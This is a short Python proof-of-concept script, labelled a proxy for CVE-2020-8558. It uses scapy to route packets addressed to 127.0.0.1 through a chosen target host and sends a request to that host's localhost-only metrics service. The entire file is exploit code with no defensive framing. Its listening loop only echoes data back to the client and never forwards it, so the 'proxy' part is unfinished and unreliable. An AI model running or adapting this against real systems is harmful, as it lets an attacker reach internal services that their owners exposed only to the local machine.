#! /usr/bin/env python3

import socket
import argparse

from scapy.all import *

def main():

    ########################################
    # Setup

    parser = argparse.ArgumentParser(description='Proxy for CVE-2020-8558')
    parser.add_argument('--localport', type=int, help='Port to receive connections', default="8080" )
    parser.add_argument('--targetport', type=int, help='Port of the target localhost service', default="8080" )
    parser.add_argument('target', type=str )
    args = parser.parse_args()

    conf.use_pcap = True
    conf.route.add(host="127.0.0.1",gw=args.target,metric=0)
    #print(repr(conf.route))

    server = TCP_client.tcplink(Raw, "127.0.0.1", args.targetport)
    server.send(b"GET /metrics HTTP/1.0\r\n\r\n")

    ########################################
    # listen

    clisock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clisock.bind(("127.0.0.1",args.localport))
    clisock.listen()

    while True:
        client, clientaddr = clisock.accept()
        while True:
            data = client.recv(1500)
            if not data: break
            client.send(data)
        client.close()


   
if __name__ == '__main__':
    main()
